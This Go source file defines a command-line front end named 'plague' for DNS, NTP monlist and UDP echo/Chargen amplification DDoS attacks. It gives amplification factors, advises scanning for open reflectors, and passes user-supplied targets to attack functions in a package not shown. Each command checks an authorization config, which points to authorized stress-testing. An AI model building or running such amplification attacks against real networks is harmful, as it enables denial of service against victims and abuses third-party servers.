package cli

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/spf13/cobra"

	"vivarium/internal/common"
	"vivarium/internal/plague"
)

var (
	plagueTarget      string
	plagueRounds      int
	plagueConcurrency int
	plagueDelay       time.Duration
	plagueResolvers   string
	plagueServers     string
	plagueReflectors  string
)

func init() {
	rootCmd.AddCommand(plagueCmd)

	// Cicada flags
	cicadaCmd.Flags().StringVarP(&plagueTarget, "target", "t", "", "target domain for DNS queries (required)")
	cicadaCmd.Flags().IntVarP(&plagueRounds, "rounds", "r", 1000, "number of queries to send")
	cicadaCmd.Flags().IntVarP(&plagueConcurrency, "concurrency", "c", 50, "number of concurrent workers")
	cicadaCmd.Flags().StringVar(&plagueResolvers, "resolvers", "", "comma-separated list of DNS resolvers")
	cicadaCmd.Flags().DurationVarP(&plagueDelay, "delay", "d", 0, "delay between queries")

	// Cricket flags
	cricketCmd.Flags().StringVarP(&plagueTarget, "target", "t", "", "target (unused, for consistency)")
	cricketCmd.Flags().IntVarP(&plagueRounds, "rounds", "r", 1000, "number of queries to send")
	cricketCmd.Flags().IntVarP(&plagueConcurrency, "concurrency", "c", 50, "number of concurrent workers")
	cricketCmd.Flags().StringVar(&plagueServers, "servers", "", "comma-separated list of NTP servers")
	cricketCmd.Flags().DurationVarP(&plagueDelay, "delay", "d", 0, "delay between queries")

	// Drone flags
	droneCmd.Flags().StringVarP(&plagueTarget, "target", "t", "", "target (unused, for consistency)")
	droneCmd.Flags().IntVarP(&plagueRounds, "rounds", "r", 1000, "number of packets to send")
	droneCmd.Flags().IntVarP(&plagueConcurrency, "concurrency", "c", 50, "number of concurrent workers")
	droneCmd.Flags().StringVar(&plagueReflectors, "reflectors", "", "comma-separated list of reflectors (ip:port)")
	droneCmd.Flags().DurationVarP(&plagueDelay, "delay", "d", 0, "delay between packets")

	plagueCmd.AddCommand(cicadaCmd)
	plagueCmd.AddCommand(cricketCmd)
	plagueCmd.AddCommand(droneCmd)
}

var plagueCmd = &cobra.Command{
	Use:   "plague",
	Short: "Execute amplification DDoS attacks",
	Long: `Plague attacks use amplification to multiply attack traffic.
These attacks leverage DNS, NTP, and UDP echo services to reflect
and amplify traffic towards the target.

⚠️  NOTE: True amplification requires IP spoofing (raw sockets).
These implementations measure amplification potential.

Available plagues:
  cicada  - DNS amplification (Cicada Song)
  cricket - NTP MONLIST amplification (Cricket Swarm)
  drone   - UDP echo amplification (Drone Chorus)`,
}

var cicadaCmd = &cobra.Command{
	Use:   "cicada",
	Short: "DNS amplification attack",
	Long: `Cicada Song uses DNS resolvers to amplify traffic.
Sends DNS ANY queries which return large responses.

Amplification factor: typically 28-54x`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if plagueTarget == "" {
			return fmt.Errorf("--target domain is required")
		}

		var resolvers []string
		if plagueResolvers != "" {
			resolvers = strings.Split(plagueResolvers, ",")
		}

		fmt.Println("\n🦗 CICADA SONG - DNS Amplification...")
		fmt.Printf("   Target domain: %s\n", plagueTarget)
		fmt.Printf("   Rounds: %d\n", plagueRounds)
		fmt.Printf("   Concurrency: %d\n", plagueConcurrency)
		if len(resolvers) > 0 {
			fmt.Printf("   Resolvers: %d custom\n", len(resolvers))
		} else {
			fmt.Printf("   Resolvers: using defaults\n")
		}
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping...")
			cancel()
		}()

		cicada := plague.NewCicada(resolvers)
		opts := plague.AttackOpts{
			Rounds:      plagueRounds,
			Concurrency: plagueConcurrency,
			Delay:       plagueDelay,
			Verbose:     IsVerbose(),
		}

		result, err := cicada.Attack(ctx, plagueTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total queries:    %d\n", result.TotalRequests)
		fmt.Printf("   Successful:       %d\n", result.Successful)
		fmt.Printf("   Failed:           %d\n", result.Failed)
		fmt.Printf("   Duration:         %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Queries/sec:      %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())
		fmt.Printf("   Amplification:    %.1fx\n", result.Amplification)

		return nil
	},
}

var cricketCmd = &cobra.Command{
	Use:   "cricket",
	Short: "NTP MONLIST amplification attack",
	Long: `Cricket Swarm uses NTP servers to amplify traffic.
Sends monlist queries which can return huge responses.

Amplification factor: up to 556x (when vulnerable servers found)
Note: Most modern NTP servers have disabled monlist.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}

		var servers []string
		if plagueServers != "" {
			servers = strings.Split(plagueServers, ",")
		}

		fmt.Println("\n🦗 CRICKET SWARM - NTP MONLIST Amplification...")
		fmt.Printf("   Rounds: %d\n", plagueRounds)
		fmt.Printf("   Concurrency: %d\n", plagueConcurrency)
		if len(servers) > 0 {
			fmt.Printf("   NTP Servers: %d custom\n", len(servers))
		} else {
			fmt.Printf("   NTP Servers: using defaults\n")
		}
		fmt.Println()
		fmt.Println("   ⚠️  Note: Most NTP servers have disabled monlist.")
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping...")
			cancel()
		}()

		cricket := plague.NewCricket(servers)
		opts := plague.AttackOpts{
			Rounds:      plagueRounds,
			Concurrency: plagueConcurrency,
			Delay:       plagueDelay,
			Verbose:     IsVerbose(),
		}

		result, err := cricket.Attack(ctx, "", opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total queries:    %d\n", result.TotalRequests)
		fmt.Printf("   Successful:       %d\n", result.Successful)
		fmt.Printf("   Failed:           %d\n", result.Failed)
		fmt.Printf("   Duration:         %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Queries/sec:      %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())
		fmt.Printf("   Amplification:    %.1fx\n", result.Amplification)

		return nil
	},
}

var droneCmd = &cobra.Command{
	Use:   "drone",
	Short: "UDP echo amplification attack",
	Long: `Drone Chorus uses UDP echo services to amplify traffic.
Targets Chargen (port 19), QOTD (port 17), and Echo (port 7).

Requires --reflectors with discovered servers.
Use network scanning to find open Chargen/QOTD servers first.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if plagueReflectors == "" {
			return fmt.Errorf("--reflectors is required (comma-separated ip:port list)")
		}

		reflectors := strings.Split(plagueReflectors, ",")

		fmt.Println("\n🐝 DRONE CHORUS - UDP Echo Amplification...")
		fmt.Printf("   Reflectors: %d\n", len(reflectors))
		fmt.Printf("   Rounds: %d\n", plagueRounds)
		fmt.Printf("   Concurrency: %d\n", plagueConcurrency)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping...")
			cancel()
		}()

		drone := plague.NewDrone(reflectors)
		opts := plague.AttackOpts{
			Rounds:      plagueRounds,
			Concurrency: plagueConcurrency,
			Delay:       plagueDelay,
			Verbose:     IsVerbose(),
		}

		result, err := drone.Attack(ctx, "", opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total packets:    %d\n", result.TotalRequests)
		fmt.Printf("   Successful:       %d\n", result.Successful)
		fmt.Printf("   Failed:           %d\n", result.Failed)
		fmt.Printf("   Duration:         %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Packets/sec:      %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())
		fmt.Printf("   Amplification:    %.1fx\n", result.Amplification)

		return nil
	},
}
